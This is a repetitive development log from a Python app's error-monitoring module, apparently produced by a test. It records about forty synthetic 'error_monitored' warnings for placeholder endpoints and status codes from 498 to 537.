WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 898'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733596Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 899'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733649Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 900'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 901'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 902'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 903'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733868Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 904'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733927Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 905'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733978Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 906'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734032Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 907'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 908'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 909'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 910'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734300Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 911'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734375Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 912'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734434Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 913'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734487Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 914'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734563Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 915'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 916'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734712Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 917'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734769Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 918'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734825Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 919'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 920'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734926Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 921'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.734975Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 922'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735024Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 923'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735073Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 924'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 925'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 926'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735223Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 927'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735276Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 928'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735328Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 929'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735378Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 930'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 931'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735478Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 932'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735526Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 933'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 934'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 935'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735671Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 936'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735721Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 937'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
